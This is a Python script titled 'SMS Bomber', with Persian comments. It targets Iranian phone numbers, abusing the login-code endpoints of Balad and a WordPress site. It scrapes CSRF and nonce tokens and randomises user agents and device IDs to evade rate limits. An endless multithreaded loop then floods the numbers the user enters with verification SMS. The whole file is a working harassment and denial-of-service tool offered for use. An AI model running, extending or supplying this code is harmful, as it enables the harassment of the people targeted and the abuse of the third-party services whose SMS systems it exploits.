import requests
import re
import uuid
from threading import Thread
from time import sleep
import socket
import urllib3
import random

# غیرفعال کردن هشدارهای urllib3
urllib3.disable_warnings()

# تعریف user_agents
user_agents = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0", 
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15"
]

# رنگ‌ها برای خروجی
r, g, y, a = '\033[31;1m', '\033[32;1m', '\033[33;1m', '\033[0m'

# ==========================
# بررسی اتصال اینترنت
# ==========================
def check_internet():
    try:
        socket.gethostbyname("smtp.gmail.com")
        return True
    except socket.gaierror:
        return False

# ==========================
# اعتبارسنجی شماره‌ها
# ==========================
def is_phone(phone_input: str):
    phones = phone_input.split('-')
    valid_phones = []
    for phone in phones:
        phone = phone.strip()
        if re.match(r"^(?:\+989|989|09|9)\d{9}$", phone):
            valid_phones.append(re.sub(r"^(?:\+989|989|09|9)", "+989", phone))
        else:
            print(f"{r}[-] Invalid Phone: {phone}{a}")
    return valid_phones if valid_phones else False

# ==========================
# تابع ارسال ایمن
# ==========================
def send_service_safe(service, phone):
    try:
        service(phone)
    except Exception as e:
        print(f"{r}[!] {service.__name__} Exception for {phone}: {e}{a}")

# ==========================
# توابع سرویس‌ها
# ==========================
def Balad(phone):
    try:
        url = "https://account.api.balad.ir/api/web/auth/login/"
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "device-id": str(uuid.uuid4()),  # UUID رندوم برای هر درخواست
            "User-Agent": random.choice(user_agents)
        }
        
        payload = {
            "phone_number": phone,
            "os_type": "W"
        }
        
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(Balad) Code Sent{a}')
            return True
        else:
            print(f'{r}[-] Balad HTTP Error: {response.status_code} - {response.text[:100]}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] Balad Exception: {e}{a}')
        return False

def nillarayeshi(phone):
    try:
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        session = requests.Session()
        
        # دریافت صفحه اصلی
        home_response = session.get(
            "https://nillarayeshi.com/", 
            timeout=10, 
            headers={"User-Agent": random.choice(user_agents)}
        )
        home_response.encoding = 'utf-8'
        
        # استخراج مقادیر با الگوهای مختلف
        csrf_match = re.search(r'name="csrf" value="([^"]+)"', home_response.text)
        nonce_match = re.search(r'name="dig_nounce" value="([^"]+)"', home_response.text)
        
        csrf = csrf_match.group(1) if csrf_match else ""
        nonce = nonce_match.group(1) if nonce_match else ""
        
        if not csrf or not nonce:
            print(f'{r}[-] nillarayeshi: Could not extract tokens{a}')
            return False
        
        payload = {
            "action": "digits_check_mob",
            "countrycode": "+98",
            "mobileNo": formatted_phone,
            "csrf": csrf,
            "login": "2",
            "digits": "1",
            "json": "1",
            "dig_nounce": nonce
        }
        
        headers = {
            "User-Agent": random.choice(user_agents),
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://nillarayeshi.com",
            "Referer": "https://nillarayeshi.com/",
        }
        
        response = session.post(
            "https://nillarayeshi.com/wp-admin/admin-ajax.php",
            data=payload,
            headers=headers,
            timeout=10
        )
        
        print(f'{y}[Debug] nillarayeshi Response: {response.status_code} - {response.text[:200]}{a}')
        
        if response.status_code == 200:
            if "success" in response.text.lower() or "1" in response.text:
                print(f'{g}(nillarayeshi) Code Sent{a}')
                return True
        return False
            
    except Exception as e:
        print(f"{r}[!] nillarayeshi Exception: {e}{a}")
        return False


# ==========================
# لیست سرویس‌ها (می‌توانی همه سرویس‌های V4 را اضافه کنی)
# ==========================
services = [Balad, nillarayeshi]

# ==========================
# تابع VIP مولتی‌تردینگ
# ==========================
def vip(phones, delay=0.1):
    print(f"{g}Targets: {y}{', '.join(phones)}{a}")
    print(f"{g}Services Loaded: {y}{len(services)}{a}")
    print(f"{g}Delay: {y}{delay}s{a}")
    try:
        while True:
            for phone in phones:
                for service in services:
                    Thread(target=send_service_safe, args=(service, phone)).start()
                    sleep(delay)
    except KeyboardInterrupt:
        print(f"{g}[+] Mission Completed!{a}")

# ==========================
# منوی اصلی
# ==========================
def main_menu():
    print(f"""
{y}╔════════════════════════════════════════════╗
{g}║         SMS Bomber by M.M.]R               ║
{y}╚════════════════════════════════════════════╝
{g} Coded by: {r}M.M.]R{a}
{y}══════════════════════════════════════════════
{g} Services Loaded: {y}{len(services)}{a}
{g} Enter phone numbers (separated by - for multiple):
{a} Example: +989123456789-+989987654321
{y}══════════════════════════════════════════════
""")

# ==========================
# نقطه ورود
# ==========================
if __name__ == "__main__":
    if not check_internet():
        print(f"{r}[-] No internet connection!{a}")
    else:
        main_menu()
        phones = None
        while not phones:
            phone_input = input(f'{g}[?] Enter Phone(s) (+98): {a}')
            phones = is_phone(phone_input)
            if not phones:
                print(f"{r}[-] No valid phones entered!{a}")
        try:
            delay = float(input(f'{g}[?] Delay (seconds) [Default=0.1]: {a}') or 0.1)
        except ValueError:
            delay = 0.1
        vip(phones, delay)
